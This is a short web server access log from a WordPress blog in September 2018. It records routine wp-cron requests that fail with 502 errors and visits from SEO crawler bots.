219.94.203.142 - - [23/Sep/2018:09:53:19 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537663999.6673319339752197265625 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
54.36.148.86 - - [23/Sep/2018:09:53:19 +0900] "GET /blog/%E3%82%B9%E3%82%BF%E3%83%83%E3%83%95%E3%82%88%E3%82%8A/kiji1045/feed/ HTTP/1.1" 200 1107 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
219.94.203.142 - - [23/Sep/2018:10:12:24 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537665144.4893219470977783203125 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
46.229.168.144 - - [23/Sep/2018:10:12:24 +0900] "GET /blog/%E6%9C%AA%E5%88%86%E9%A1%9E/kiji1878/ HTTP/1.1" 200 18387 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
219.94.203.142 - - [23/Sep/2018:10:26:41 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537666001.6630430221557617187500 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
46.229.168.144 - - [23/Sep/2018:10:26:41 +0900] "GET /blog/date/2014/02/ HTTP/1.1" 200 25878 "-" "Mozilla/5.0 (compatible; SemrushBot/2~bl; +http://www.semrush.com/bot.html)"
216.244.66.226 - - [23/Sep/2018:10:41:52 +0900] "GET /robots.txt HTTP/1.1" 404 2275 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
219.94.203.142 - - [23/Sep/2018:10:42:04 +0900] "POST /blog/wp-cron.php?doing_wp_cron=1537666924.3743550777435302734375 HTTP/1.0" 502 226 "-" "WordPress/3.5.1; http://www.nishifuna-seitai.com/blog"
